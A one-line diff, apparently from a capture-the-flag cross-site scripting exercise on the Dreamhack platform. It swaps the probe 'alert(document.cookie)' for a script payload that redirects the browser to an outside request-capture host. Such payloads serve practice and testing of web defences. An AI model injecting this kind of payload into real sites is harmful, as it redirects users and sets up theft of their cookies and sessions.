@@ -1,1 +1,1 @@
-alert(document.cookie)
+location='https://xfeuimc.request.dreamhack.games';
